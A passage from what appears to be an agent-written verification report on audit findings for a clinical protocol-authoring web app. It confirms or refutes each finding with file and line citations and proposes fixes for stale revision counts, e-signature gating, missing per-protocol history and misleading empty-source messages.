  - `ProtocolGov.tsx:139-183, 274-281`
  - `ProtocolDev.tsx:50-125, 181-222`
  - `ProtocolDevWorkspace.tsx:41-73` (the tab list), `117-149` (header), `226-280` (tab bodies), `306-403`
  - `ProtocolDevPanes.tsx:36-202`, `ProtocolDevRegisters.tsx:86-171`, `ProtocolDevReviews.tsx:39-112`, `ProtocolDevSection.tsx:150-243`
  - `RichSectionEditor.tsx:177-305` (its props)
  - I grepped every `ProtocolDev*` file, plus `IrbPackage.tsx` and `biostatBridge.tsx`, for audit/history/version/`onNav`.
- **Rails and AnA:**
  - `Shell.tsx:747, 944-957` and `registryModel.ts:1148`. The "Recent activity" block is static config and is deliberately left empty.
  - `AnaToolExecutor.ts:899-963, 11601-11632, 19656-19680`, and every AnA tool name.
- **Global surfaces (the guards that could already cover this):**
  - `AdminSurfaces.tsx:1006-1028`
  - `audit-trail-ledger.routes.ts:329-526`
  - `audit-api-authority.ts:26-70`
  - `shared/navigation/index.ts:99`
  - `Part11Console.tsx:121-123`
  - `part11-compliance.ts:373` (grepped the client for callers)
  - The DocumentWorkbench audit rail, `DocumentWorkbench.tsx:1611-1627`
  - `project-vault.ts:1495-1547`
- **Server:**
  - `protocol-dev.routes.ts` (whole file)
  - `pdev-view-assembler.ts:384-590`
  - `protocol-development.ts:94-163, 193-209, 352-367, 476-529`
  - `protocol-development-service.ts:203-246, 359-413`
  - `c2c/actions.ts:341-431`
  - The target strings in every `protocol-*.ts` route
  - `protocol-export*` (no history)
  - Migrations `20260621:126-135`, `20260622`, `20260629*`, `20260702`

**Why:**

1. **The shared audit panel is mounted nowhere.** `ProtocolGov.tsx:155` has `export function AuditTrail({ entries }: { entries?: AuditEntry[] }) {`. A repo-wide grep finds no mount of it anywhere, only the window bridge at `:278`.
2. **The workspace has no history view.** None of its 16 tabs (`ProtocolDevWorkspace.tsx:41-73`) is history or audit. Only the Statistics tab gets `onNav` (`:271`), and it leads to biostatistics, protocol-dev, tasks and submission-center (`biostatBridge.tsx:195, 339-341`). Yet the save toast points the user there: `ProtocolDevWorkspace.tsx:373` says `'Section saved — the revision is in the audit trail.'`, a trail this surface cannot open.
3. **The read model carries no history.**
   - The SELECT at `pdev-view-assembler.ts:386-387` has no `finalized_*` columns.
   - The return object at `:536-589` has no versions/history key.
   - No query reads `protocol_versions`, `audit_logs` or `c2c_ana_actions`.
   - Risk rows (`:410`, `:561-567`) and review rows (`:421`) omit `created_by` and `created_at`, though the tables have them.
4. **The one reader of `protocol_versions` has no client caller.**
   - `protocol_versions` is read only at `protocol-development-service.ts:412`, inside `getProtocolDocument`, which serves `GET /documents/:id` (`protocol-development.ts:199-209`).
   - No client calls that route. The only protocol-development GET in the client is `/design-derivation` (`ProtocolDevDerivation.tsx:100`).
   - The AnA finalize tool calls `getProtocolDocument` (`AnaToolExecutor.ts:11607`) but returns only status, version and completeness.
   - `get_document_versions` reads `concept2cure_artifact_versions`, a different store.
   - No AnA tool reads the audit ledger.
5. **The global fallbacks do not reach this protocol's history.**
   - The Audit trail surface fetches `useLiveRows('/api/audit-trail/ledger')` (`AdminSurfaces.tsx:1017`) with no limit, so the server default applies: `req.query.limit ?? '200'` (`audit-trail-ledger.routes.ts:487`).
   - It is refused to anyone but `['owner','admin','manager']` (`:483`; `audit-api-authority.ts:26`).
   - Search runs in the browser over those 200 rows (`AdminSurfaces.tsx:1019-1028`).
   - It accepts no navigation params (`shared/navigation/index.ts:99`), so neither a link nor AnA can open it filtered to one protocol.
   - Child writes are logged under their own ids: `protocol-section:` (`protocol-development.ts:367`), `protocol-visit:` (`:423`, `:438`), `protocol-risk:` (`protocol-risks.ts:113`), and so on. Searching "protocol-document:<id>" cannot find those.
   - `Part11Console` reads only chain integrity, compliance status and SOC 2.
6. **The rows themselves exist.** `governed()` (`protocol-development.ts:94-121`) calls `recordGovernedAction`, which inserts both `audit_logs` and `c2c_ana_actions` (`actions.ts:374-431`). The ledger is written; nothing in this workspace can reach it.

One citation in the report is wrong but does not matter: `getProtocolDocument` is at `protocol-development-service.ts:403-414`, not `protocol-development.ts`.

**If confirmed, the smallest correct fix:**

1. **Add a per-protocol history route.** `GET /api/protocol-development/documents/:id/history` should first confirm the protocol belongs to the org. It should then read through the existing `readRecordAuditHistory` (`audit-trail-ledger.routes.ts:428`), following the Vault precedent at `project-vault.ts:1504-1535`, so no second audit query is written.
   - Extend that reader to take a set of (`table_name`, `record_id`) pairs.
   - Resolve the child records by `protocol_document_id`: section, visit, soa-assessment, risk, deviation, capa, amendment, milestone, review-assignment and review-comment.
   - Return the `protocol_versions` rows, with `created_by` resolved to a name.
2. **Show it in the workspace.** Mount `PG.AuditTrail` as a History tab or rail, and add reason and meaning to its row shape.
3. **Put who/when on register rows.** Show `created_by` (as a name) and `created_at` on the risk, deviation, amendment, budget and review rows.

Where the report's proposed fix is wrong or incomplete:
- **The filter is wrong both ways.** `target LIKE 'protocol-document:<id>%'` shows other protocols' history (`protocol-document:2%` also matches 20, 21, 200…). It also misses every child-record event. Match exact pairs instead.
- **There is no `updated_by` column.** The register tables only have `created_by`, `created_at` and `updated_at`, so the last person to change a row has to come from the ledger.
- **Version history will show little.** In practice `protocol_versions` only gets finalize snapshots: no client calls `POST /documents/:id/versions`. And `updateSectionTx` overwrites `protocol_sections.content` on every save (`protocol-development-service.ts:225-228`). So history can show who, when and why a section changed, but not the earlier text. That text-retention gap is a separate §11.10(e) question worth raising.
- **Access needs a decision.** The tenant-wide ledger is deliberately limited to owners, admins and managers. Who may read a single record's history should be decided on purpose, as the Vault precedent did.

---

## Verification of P11-C-4
**Verdict:** CONFIRMED

**Severity, as you would grade it:** medium. It is a real defect with an easy workaround. Every finalized protocol, and every signed review, keeps offering an e-signature that the server is certain to refuse, and the offer costs the signer their password, their authenticator code and part of their signing-attempt budget. The gate also reads "Ready to finalize" on a protocol that is already finalized. It is not high: nothing is written, the header badge and the review row show the true state, and the refusal is honest.

**What I checked:** HEAD is `26fbf978a`. Its only change since `7087f46e2` is `docs/work-orders/README.md`, so everything below holds at the reviewed commit.
- **Client, finalize path:**
  - `ProtocolDevPanes.tsx:38-69` (Outline)
  - `ProtocolGov.tsx:98-137` (CompletenessGate; its only caller is `ProtocolDevPanes.tsx:64`)
  - `ProtocolDevWorkspace.tsx:117-149`, `226-239`, `306-473`
  - `ProtocolDev.tsx:181-221`
- **Client, disposition path:**
  - `ProtocolDevReviews.tsx:39-79`
  - `ProtocolDevForms.tsx:166-174` and `370-392`
  - `ProtocolDevSigning.tsx` (whole file)
- **Client, shared:**
  - `EsignModal.tsx:179-344`
  - `useEsignature.ts:104-110`
  - `ProtocolDevWrites.ts:84-96` and `346-382`
- **Server:**
  - `protocol-dev.routes.ts` (whole file)
  - `pdev-view-assembler.ts:55-70` and `384-590`
  - `protocol-development-logic.ts:98-154`
  - `protocol-development-service.ts:80-90` and `353-390`
  - `protocol-development.ts:63-91` and `492-529`
  - `protocol-reviews.ts:39-65` and `151-206`
  - `protocol-reviews-service.ts:83-173`
  - `protocol-signature.ts` (whole file)
  - `signing-attempt-limiter.ts` (whole file)
  - `esignature.ts:66-93`
  - `register-inline-routes.ts:592` and `630`
- **Places a guard could have been:**
  - Mount middleware: auth only, no status guard.
  - CSS: nothing hides `.pd-outline-gate`, `.pg-btn` or `.pde-review-act` by status.
  - `openFinalize`: checks only `canWrite`.
  - The disposition drawer: no check at all.
  - `EsignModal`: knows nothing about the record's status.
  - `ProtocolSignModal`: passes no status.
  - `protocolDevSurfaceWrites.test.tsx`: tests only the pre-terminal happy paths; none covers a finalized protocol or a signed review.
- **For the fix:**
  - `protocol-soa.ts:57-88` and `protocol-soa-service.ts:28-59`.
  - A grep of the amendments, budget, deviations, milestones, reviews, risks and soa service folders under `server/services/protocol-*` for `finalized|superseded|assertEditable` finds nothing.

**Why:**
- **Finalize is gated only on completeness, never on status.**
  - `ProtocolDevPanes.tsx:47`: `const ready = !findings.some((f) => ['critical', 'blocking'].includes(str(f.sev)));`
  - `ProtocolGov.tsx:130`: `<button className="pg-btn primary block" disabled={!ready} onClick={onAction}>`
  - `ProtocolDevWorkspace.tsx:318`: `const canWrite = Number.isInteger(numericDocId) && numericDocId > 0;`
  - `openFinalize` (`:331-334`) checks only `canWrite`, and the Outline is mounted unconditionally (`:368`).
- **A finalized protocol keeps `ready = true`.**
  - The findings come from the status-blind `evaluateCompleteness` (`pdev-view-assembler.ts:496-503`).
  - Its readiness test is the same one the client uses: `protocol-development-logic.ts:153`: `const readyToFinalize = !findings.some((f) => f.severity === 'critical');`
  - Finalizing required that test to pass, and content writes are refused afterwards, so the result does not change.
- **The finalized protocol stays on screen.**
  - The read has no status filter and is `ORDER BY updated_at DESC` (`pdev-view-assembler.ts:389-390`).
  - Finalize sets `updated_at = now()` (`protocol-development-service.ts:388`).
  - The surface shows `rows[0]` (`ProtocolDev.tsx:190`).
  - So right after signing, the gate still says "Ready to finalize" (`ProtocolGov.tsx:117`) with a live primary button, beside a header badge reading "Finalized" (`ProtocolDevWorkspace.tsx:130`).
- **The disposition button ignores an existing signature.**
  - `ProtocolDevReviews.tsx:65`: `disabled={someoneElses}`
  - `:69`: `defaults: disposition ? { disposition } : undefined,`
  - When the reviewer has no account (`reviewerUserId` is null), `someoneElses` is false for every writer.
  - The drawer then hands straight to signing (`ProtocolDevForms.tsx:373-374`), and the workspace opens the modal (`ProtocolDevWorkspace.tsx:450-459`).
- **The password is taken and checked before any request that could be refused.**
  - `EsignModal.tsx:291-294`: the Sign button needs a reason of at least 8 characters, a password of at least 6, and a 6-digit code when the signer has an authenticator enrolled.
  - Then `:302` `const pw = await esig.verifyPassword(password);`, then `:318` `const mfa = await esig.verifyMfa(totp);`, and only then `:328` `const signed = await onSign({`.
  - On the server, `protocol-signature.ts:167` `const verified = await verifyReauth(userId, reauth);` runs before BEGIN (`:175`), before the authorship check (`:177`) and before the write (`:178`). The state refusal lives inside that write:
    - `protocol-development-service.ts:376`: `if (doc.status === 'finalized') throw new ProtocolDevError('INVALID_STATE', 'Protocol is already finalized.');`
    - `protocol-reviews-service.ts:150-151`: `if (row.status === 'completed' || row.disposition != null) { throw new ProtocolReviewError('INVALID_STATE', 'A disposition is already signed for this review. Nothing was recorded.');`
- **What the wasted attempt costs.**
  - `EsignModal.tsx:339-341` clears the password and code ("The credentials were spent on this attempt").
  - Each try uses one of the 10 attempts per 5 minutes on the `protocol-sign` scope, which finalize and disposition share (`signing-attempt-limiter.ts:43-44`), and one on the verify-password limiter.
  - The authorship check runs before the write, and finalize proposes `authorship` by default (`ProtocolDevSigning.tsx:67`). A non-author who re-clicks can therefore be refused `NOT_AN_AUTHOR` first (`protocol-signature.ts:120-125`) and has to re-enter the password again before reaching "already finalized".
- **The outcome is honest.** A 409 carries the server's own sentence (`protocol-development.ts:81-88`), and `ProtocolDevWrites.ts:95` renders "Couldn't finalize the protocol — Protocol is already finalized. Nothing was written."
- **One trivial slip in the report:** `finalizeProtocolTx` has its own check at `:376-377` and does not call `assertEditable`.

**If confirmed, the smallest correct fix:**
1. **Finalize gate.** In `Outline` (`ProtocolDevPanes.tsx`), set `terminal = doc.status === 'finalized' || doc.status === 'superseded'`. These are exactly the server's two refusals (`protocol-development-service.ts:376-377`).
   - When `terminal` is true, pass no `onAction` and have the gate say "Finalized — v{version}" instead of "Ready to finalize". A small label prop on `CompletenessGate` is enough; it has one caller.
   - Do not do this with `ready={ready && !terminal}`. The gate would then print "0 blockers" (`ProtocolGov.tsx:121`) under a disabled button that gives no reason, which is a false statement.
   - Optionally mirror the check in `openFinalize` (`ProtocolDevWorkspace.tsx:331`).
2. **Disposition button.** In `ReviewerRow`, set `signed = disposition !== '' || str(r.status) === 'completed'`, the server's own two-part condition (`protocol-reviews-service.ts:150`). The report's version checks the disposition only.
   - Use `disabled={someoneElses || signed}` with the title "A disposition is already signed for this review", and the visible label "Disposition signed".
   - Keep both server checks.
3. **Tests.** In `protocolDevSurfaceWrites.test.tsx`, add a finalized document and a completed review. Show that both tests fail on the current code before the fix.

**Where the report's fix is wrong:**
- **Its third sentence should be dropped.** It says to "Extend canWrite similarly so every other register control is disabled … once the protocol is finalized/superseded, rather than relying on the server's after-the-fact refusal."
  - That refusal exists only for writes that go through `protocol-development-service.ts`.
  - The risk, deviation, amendment, milestone, budget, review and schedule-of-assessments services never read the protocol's status.
  - Several of those registers are legitimately written after finalization, during the study itself: deviations and CAPA, amendments (with their submitted → approved → implemented lifecycle), milestones and review requests. Disabling them wholesale would remove real work.
- **Its premise that a finalized protocol "can't actually be altered" is false for the schedule of assessments.** This is a separate defect that deserves its own finding.
  - `POST /api/protocol-soa/documents/:id/assessments`, `/cells` and `/cells/clear` (`protocol-soa.ts:57-88` → `protocol-soa-service.ts:28-59`) never read the protocol's status.
  - The grid stays editable on a finalized protocol (`ProtocolDevWorkspace.tsx:262`, `ProtocolDevSoa.tsx:243`), so a finalized protocol's schedule of assessments can still be changed.
  - It needs a server-side `assertEditable` guard. A client-only disable would just hide an unguarded write.

---

## Verification of HS-A-1
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium — every save and every revert leaves "History N" and "· N revisions" at the number from before the write, for the rest of the session on that document; every accepted AnA draft does the same. That is a wrong at-a-glance fact about the revision record. The History rail, one click away, re-reads the true list, and nothing is recorded wrongly.
**What I checked:**
- Client, `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx`:
  - 139–153 `AuthSection`; 1976–2110 `saveSectionContent`; 2234–2272 `revert`; 2643–2666 `onAiDraftAccepted`.
  - 1545–1566 `loadHistory`; 1158–1202 `loadSections` and its effect.
  - Every other `loadSections` caller: 1332 (deep link), 2572 and 2575 (move), 3132 (section create), 3386 (filing bar). None runs after a save, a revert or a section switch.
  - Renders: badge 3192–3196, meta line 3656–3659.
- Server, `server/routes/authoring.router.ts`: 1545–1580 (the list; its counts are query-time `COUNT(DISTINCT …)`), 1646–2029 (PATCH), 2103–2236 (revert), 3178–3395 (AI-draft accept).
- Schema: `db/migrations/20260725_authoring_document_loop_tables.sql:59–70`. A grep of every `.sql`, `.ts` and `.mjs` file outside tests finds `revision_count` only as the two COUNT aliases (authoring.router.ts:1508, :1554). No ALTER adds such a column.
- Runtime: a scratch vitest outside the repo (`<scratch>/verify-hsa/workbenchCounts.test.tsx`). It mounts the real `DocumentAuthoring` → `DocumentWorkbench`, feeds it the server's real response shape, and includes a control.
- The reviewed files are identical at `7087f46e2` and the current HEAD.
**Why:**
- The server never returns a count. PATCH returns `section: result.rows[0]` (authoring.router.ts:2012) from `UPDATE authoring_sections SET … RETURNING *` (:1839–1844). Revert returns `section: result.rows[0]` (:2228) from `… RETURNING *` (:2155–2160), after `createRevision(…, 'revert')` (:2174). The table has no count column.
- The client keeps the stale value:
  - `s.id === activeSection.id ? { ...s, ...(adopted ?? {}), content: persisted } : s` (:2060), and the same spread in revert (:2256), leave the old `revision_count` in place.
  - The only follow-ups are `if (rail === 'history') void loadHistory(activeSection.id);` (:2078) and `void loadHistory(activeSection.id);` (:2264).
  - `loadHistory` only calls `setRevisions(…)` (:1565).
  - So `num(activeSection.revision_count)` (:3194–3195) and `` · ${num(activeSection.revision_count)} revisions`` (:3658) never change.
- Observed:
  - After a save: badge "History 2", meta "… · 2 revisions …", and section-list GETs went from 1 to 1.
  - After a revert: "History 2".
  - Control: the same save with `revision_count: 3` on the returned row shows "History 3", so the check can fail.
- Corroborating: the toast branch ``revision ${num(adopted.revision_count)} recorded`` (:2073–2074) cannot fire in production. The unit test that asserts it stubs a `revision_count: 3` the server never sends (`client/src/concept2cure/v2/__tests__/documentAuthoringEditor.test.tsx:95`, `:140`).
- Minor inaccuracy in the report: `loadSections` does not re-run "only" when `activeDocId` changes. It also re-runs after a move, a section create and a filing-bar change. None of those follow a save or a revert, so the finding stands.
**If confirmed, the smallest correct fix:**
- Three routes mint a revision: PATCH `/sections/:sectionId`, POST `…/revert` and POST `…/ai/draft/accept`. After COMMIT, each should attach `revision_count` to the returned `section`, using the list's tenant-scoped count (`SELECT COUNT(*) FROM doc_revisions WHERE section_id=$1 AND tenant_id=$2`).
- The client already adopts the returned row, so the badge, the meta line and the "revision N recorded" toast all become true with no client change.
- Also correct the fixture at `documentAuthoringEditor.test.tsx:95` to the real response shape.
- The report's proposed fix is incomplete in two ways:
  - It misses the third path, AI-draft accept. DocumentWorkbench.tsx:2648–2650 adopts `saved.rows[0]`, which comes from `RETURNING *` at authoring.router.ts:3252–3255 and is returned at :3383.
  - A local "+1" is exact only if it is keyed to the server's `revision_created: true` (:2014). On AI accept the revision is written after commit and is non-fatal (`try { await createRevision(…) } catch … (non-fatal)`, :3344–3348), so an unconditional +1 can over-count.

## Verification of HS-A-2
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium — after a successful Remove, "Sources N" and "· N citations" overstate the section's recorded citations. After a reply, "Comments N" (and the tree dot's "N comments" title) stays below the server's own count until the document is reselected. The open rail beside the badge shows the true list, which is the workaround.
**What I checked:**
- Client, DocumentWorkbench.tsx:
  - 1790–1833 `citeSource` (its +1 is at 1817–1823); 1836–1868 `uncite`.
  - 2280–2341 `addComment` (its +1 is at 2328–2330); 2361–2395 `addReply`.
  - 4693–4790: the comments rail renders every thread in the document, unfiltered (`comments.map` at 4780); the reply controls are around 4945–4990.
  - Renders: 3060–3066, 3182–3185, 3205–3208, 3660–3662.
  - A grep shows `citation_count` and `comment_count` are written only at :1821 and :2329.
- Server:
  - authoring.router.ts 2548–2573: DELETE cite-source.
  - `server/services/clinical-regulatory-evidence/source-usage.service.ts` 246–260: a hard `DELETE FROM authoring_citations … AND frozen_at IS NULL`.
  - authoring.router.ts 2254–2320: the comment POST inserts a row with `parent_comment_id`.
  - authoring.router.ts 1551–1573: the counts.
- Runtime: the same scratch harness.
**Why:**
- The client never adjusts the counts:
  - `uncite` on success runs `fireToast('Citation removed.'); void loadSources(activeSectionId);` (:1858–1859) and never calls `setSections`.
  - `addReply` on success runs `setReplyText(''); setReplyTo(null); fireToast('Reply added to the thread.'); void loadComments(activeDocId);` (:2382–2385) and never calls `setSections`.
- The server's counts do move:
  - A reply inserts a real `authoring_comments` row (`parent_comment_id ?? null`, :2302).
  - `COUNT(DISTINCT c.id) … LEFT JOIN authoring_comments c ON c.section_id = s.id …` (:1553, :1571) counts it, because nothing filters on the parent.
  - The citation DELETE removes the row, so the true citation count drops.
- Observed:
  - After the DELETE: "Citation removed.", while "Sources 1" and "· 1 citations" still show for a section whose only citation was removed.
  - After a reply: "Comments 1", unchanged.
**If confirmed, the smallest correct fix:**
- In `uncite`'s success branch: `setSections(ss => ss.map(s => s.id === activeSectionId ? { ...s, citation_count: Math.max(0, num(s.citation_count) - 1) } : s))`.
- In `addReply`'s success branch: bump `comment_count` on `parent.section_id`.
- The report's "the same one line … addComment already use[s]" is wrong for the reply:
  - `addComment` keys on `activeSection.id` (:2329).
  - The rail lists every thread in the document (:4780), and the reply posts to `parent.section_id` (:2367).
  - Copying the line would credit the wrong section whenever the thread belongs to a different section.

## Verification of HS-A-3
**Verdict:** CONFIRMED
**Severity, as you would grade it:** low — the resync branch is dead, but the user still gets the server's own accurate sentence ("…changed since you loaded them — reload and retry. Nothing was reordered."). The route checks for an exact permutation, so nothing wrong can be written. The list was already stale before the click; the dead branch would only have refreshed it.
**What I checked:**
- DocumentWorkbench.tsx: 61 (`apiRequest` is imported from `@/lib/queryClient`), 2544–2589 (`moveSection`), 3612–3636 (the Move buttons are hidden when `docSealed`).
- `client/src/lib/queryClient.ts` 362–422 (`apiRequest`).
- authoring.router.ts 6171–6254: the reorder route.
- `server/middleware/authoringObjectAuthorization.ts` 174–181 and 258–263: the gateway also answers this path with 409 when the document is immutable.
- `documentAuthoringEditor.test.tsx:193–241`: the only existing test, which covers the happy path.
- Runtime, with a control.
**Why:**
- `apiRequest` throws on every non-2xx except 401: `if (!response.ok && response.status !== 401) { … throw new ApiRequestError(message, response.status, …) }` (queryClient.ts:398–419).
- So once the 401 check at :2560–2563 passes, a non-ok `res` can never arrive.
- That makes `if (!res.ok) { … if (res.status === 409) void loadSections(activeDocId); return; }` (:2564–2574) unreachable. The catch (:2579–2584) only shows a toast.
- Observed:
  - A thrown `ApiRequestError` 409 showed "reload and retry", and section-list GETs went from 1 to 1.
  - Control: a returned `{ok:false,status:409}` took them from 1 to 2. The resync works only under a transport contract production does not have.
- The report's "concurrent reorder" scenario is wrong:
  - Two reorders of the same set of sections both pass `isPermutation` (:6214–6218), and the second silently wins.
  - The route answers 409 only when a section was added or removed since load (:6218–6225).
  - The gateway answers 409 when the document has become immutable.
**If confirmed, the smallest correct fix:** In the catch, add `if ((e as Partial<ApiRequestError>)?.status === 409) void loadSections(activeDocId);`, and delete the unreachable `!res.ok` block (:2564–2574). The report's fix is right; it also needs that deletion.

## Verification of HS-A-4
**Verdict:** REFUTED
**Severity, as you would grade it:** low — only polish survives. "Re-read all" can be clicked on a sealed document and is then refused honestly, and its tooltip describes a per-citation freeze that nothing ever sets.
**What I checked:**
- Mount order: `server/bootstrap/register-inline-routes.ts:310–317` has `app.use('/api', authoringObjectAuthorization)` immediately before `app.use('/api/authoring', …)`, the router's only mount. Also `server/startup/routes.ts:127–173`.
- Authentication runs first: `server/startup/middleware.ts:154`, and it sets `req.user` (`server/middleware/authBoundary.ts:148–173`).
- The gateway: `server/middleware/authoringObjectAuthorization.ts` 29–40, 174–181, 216–263.
- The permission decision: `server/services/authoring/authoring-permissions.ts` 68–77, 121–129, 187–201.
- The handler, authoring.router.ts 4631–4667: it indeed checks no status.
- Status values: freeze writes `'FROZEN'` (:3858–3861) and approve writes `'APPROVED'` (:5398).
- Nothing reaches the handler another way:
  - `refresh-all` is defined only at :4631.
  - The `/api` 404 catch-all (`server/startup/services.ts:583`) is registered last.
  - `refreshSourceCitation` is called only from the two gated routes (:4333, :4651).
- I also searched for anything that writes `frozen_at`.
- Runtime:
  - The real middleware with a stubbed pool (`<scratch>/verify-hsa/refreshAllGate.test.ts`).
  - The real workbench on a FROZEN document.
**Why:**
- The gateway refuses before the handler runs:
  - The path `/authoring/docs/:id/refresh-all` matches `docMatch` (`/^\/docs\/([^/]+)(?:\/.*)?$/`, :174).
  - `actionFromPath` falls through to `return 'edit'` (:40).
  - `documentStatusAllowsAction` returns `!IMMUTABLE_DOCUMENT_STATUSES.has(String(status ?? '').trim().toUpperCase())` (authoring-permissions.ts:128), and that set holds `'APPROVED'` and `'FROZEN'` (:68–77).
  - This check runs before the global-admin shortcut (:195, then :199).
  - The gateway then answers `res.status(409)` with `AUTHORING_DOCUMENT_IMMUTABLE` (authoringObjectAuthorization.ts:258–263).
- Observed at the gateway:
  - FROZEN, APPROVED and lowercase `frozen` all return 409, for an OWNER and for an ADMIN.
  - Controls: draft and IN_REVIEW call `next()`.
- Observed in the UI, on a FROZEN document:
  - The button is enabled (`disabled={!activeDocId || refreshingAll}`, :4466).
  - A click shows "Couldn’t re-read this document’s sources — Document status FROZEN does not permit this action.. Nothing was changed."
  - No checksum changes, so the "cannot be edited" banner (:3747–3754) holds.
- Two sub-claims are true:
  - The handler itself checks no status.
  - `authoring_citations.frozen_at` has no production writer. It appears only in `frozen_at IS NULL` guards: source-usage.service.ts:218, :256, :508 and authoring.router.ts:4642. So the tooltip's "Frozen citations are left alone" (:4468) never applies.
- The other report is right: the gateway middleware guards this route.
**If confirmed, the smallest correct fix:**
- The claimed defect needs no fix.
- Polish:
  - Add `|| docSealed` to the button's `disabled`, with a sealed-state title like Revert's (:4282–4283).
  - Drop the "Frozen citations are left alone" clause from the tooltip.
- The report's proposed route-level `LOCKED_DOCUMENT_STATUSES` check would never run while the gateway is mounted; the reorder route's own 403 at :6201–6206 is already unreachable for the same reason. It is acceptable only as a labelled backstop.
- `docs/design/LINEAGE_END_TO_END_PLAN_2026-09-25.md:47` and `:302` repeat the same wrong claim ("no status check", "rewrites the cite-time checksums of a sealed document") and should be corrected.

---

## Verification of HS-B-1
**Verdict:** PARTLY CONFIRMED. The symptom is real, and I reproduced it through the real host. The report's account of the cause and its fix are partly wrong, and it missed a worse effect of the same cause.

**Severity, as you would grade it:** high. When the Data Room read fails, nothing on screen says so: the Cite picker, the Sources rail's own picker and the Vault rail all say the Data Room has nothing to cite and tell the writer to add documents. The same empty library also repaints existing in-text citations as "[Citation unresolved — the cited source is not available to this document]" with the advice "Cite another source or delete it". That is materially misleading about governed content. It is not a blocker, because nothing is recorded, changed or lost unless the writer saves a change, and inserting a citation refuses a source that does not resolve. The picker sentence on its own, with its loading flash that corrects itself, would be medium.

**What I checked:**
- The files are unchanged between `7087f46e2` and the current HEAD.
- `RichSectionEditor.tsx`:
  - 280-303: the `citationsApi` contract.
  - 665-689: library → lookup → repaint.
  - 1593-1643: opening the picker and inserting a citation.
  - 1967-1976: the Cite button. It has no disabled or loading guard.
  - 2468-2533: the bar's guard and its two branches.
  - 760-766: the Citation node is configured to read the lookup.
- `DocumentWorkbench.tsx`:
  - 792-796: the source state.
  - 1158-1191: `loadSections` auto-selects the first section, so the editor mounts before any source read starts.
  - 1636-1671: both loaders.
  - 1693-1714: the effect that fires both reads on every section change and every rail change.
  - 1716-1740: `citationLibrary`.
  - 3785-3927: the editor mount. `citationsApi` is passed unconditionally.
  - 4506-4546: the Sources rail's states and its picker.
  - 4660-4670: the Vault rail receives the same `projectSources`.
- `ProjectFilesPanel.tsx`:144-147 and 582-584.
- `citationNode.ts`:218-228 and 247-275; `shared/authoring/citations.ts`:101-102, 223-232 and 280-313.
- Server routes: `server/routes/c2c/projects.ts`:1630-1700 (returns 403, 404 or 500), mounted at `register-inline-routes.ts:848`; `authoring.router.ts`:2500-2511 (returns 500). Both depend on `source-usage.service`, so one fault there fails both reads.
- Tests: `citationsInCanvas.test.tsx`:116-126 pins the empty-library sentence. `documentAuthoringSourcesRail.test.tsx`:202-206 fails only the section read. No test fails the Data Room read.
- Runtime check: 9 scratch vitest cases, kept in the scratchpad and outside the repo. They mount the real `DocumentAuthoring` → `DocumentWorkbench` → `RichSectionEditor` with a mocked `apiRequest`, and all 9 behaved as described below.

**Why:**
- **The bar has one branch on the data.**
  - `RichSectionEditor.tsx:2482` `{citationSources && citationSources.length > 0 ? (` … `:2530-2531` "No sources are available to this document yet. Add one in the Sources panel, then cite it here."
  - The contract has no status field (`:299-303`).
  - The bar can render while the reads are in flight. Its guard is only `:2468` `citeOpen && citationsApi && boot.mode === 'rich' && !readOnly`, and the button at `:1967` `{citationsApi && (` is never disabled.
- **The library is the union of two reads** (`DocumentWorkbench.tsx:1737-1738`), and they behave differently:
  - `sources` is cleared at the start of every load and on error (`:1642-1643`, `:1649-1650`), with a 4-state status.
  - `projectSources` (the Data Room) has **no status variable at all** (`:796`). It is **not** cleared when a load starts; its only empty value before the first read is the initial `useState([])`. Every failure (403, 404, 500 or network) collapses to empty: `:1670` `setProjectSources(ok && Array.isArray(body?.sources) ? body!.sources! : []);`.
- **What the person sees (reproduced):**
  - **First load:** Cite shows the sentence until the Data Room read lands, then the picker. The picker then displays the first source, but Insert answers "Choose the source to cite.", because `:1601` seeded `citeSource` from the empty library and nothing re-seeds it.
  - **Data Room read returns 500 and the section read is fine but empty:** the exact sentence a genuinely empty Data Room produces, and it stays. Following its advice, the rail's "Record a source" says "No project sources available. Add documents to the project's data room first…" (`:4535-4538`). No "Couldn't load" appears anywhere.
  - **Both reads fail:** the same sentence. Existing citations paint `CITATION_MISSING_TEXT`, with the tooltip "…Cite another source or delete it." (`citationNode.ts:270-274`). The component's own docstring promises instead that they "say plainly that they could not be checked" (`RichSectionEditor.tsx:296-297`).
- **Where the report is wrong:**
  - "The loading branch (line 1643, fired on every section open)" does not empty the library when the Data Room is populated. A section switch kept the picker populated while the new section read was pending (reproduced).
  - `sourcesState` is not what triggers the message: a section-read 500 with a populated Data Room shows the picker, not the sentence (reproduced).
  - The rail "gets right" the distinction only for the section read (`:4512-4521`). Its own picker makes the same mistake for the Data Room.

**If confirmed, the smallest correct fix:**
1. `DocumentWorkbench.tsx:1661-1671`: give the Data Room read its own `loading | ready | error` state. Having no `pid` counts as ready-and-empty. A failure sets `error` instead of storing `[]`.
2. At `:3902`, pass a combined status in `citationsApi`: `error` if either read failed; `loading` while either is idle or in flight; otherwise `ready`.
3. In `RichSectionEditor.tsx`, add an optional `status?: 'loading' | 'ready' | 'error'` to `citationsApi` (`:299-303`), defaulting to `ready` so the existing tests stay valid. In the bar (`:2482-2533`):
   - print "No sources are available…" only when the status is `ready`;
   - show a "Reading…" line while it is `loading`;
   - on `error`, say the sources could not be read, which is not the same as having none;
   - if the list is non-empty but one read failed, show a note that it may be incomplete;
   - re-seed `citeSource` when the library arrives (`:1599-1603`).
4. While the status is not `ready`, a citation that does not resolve must paint "could not be checked" instead of `CITATION_MISSING_TEXT` plus "delete it" (`citationNode.ts:262-275`, through the lookup at `:764-766`). Add the status to the repaint key (`:687-689`).
5. Gate the two sibling sentences on the same Data Room state: `DocumentWorkbench.tsx:4535-4538`, and `ProjectFilesPanel.tsx:582-584` (prop at `:4666`).
6. Add a host test that fails `/api/c2c/projects/:id/sources`.

The report's fix is incomplete. It threads only `sourcesState`, which reads `ready` in the main failure case (Data Room 500, section read fine), so its new branch would never fire. It also leaves the false "unresolved" markers on existing citations, the stale picker selection, and the two sibling sentences untouched.

---

## Verification of HS-B-2
**Verdict:** CONFIRMED. The mechanism is as reported, and so is the claim that no current host mounts a full-chrome, editable editor without `storageKey`. The report is wrong to call the defect only latent. The same unconditional label is false today by two other routes, in all three hosts that show the footer. DocumentWorkbench's "Leave without saving" dialog makes the same false promise.

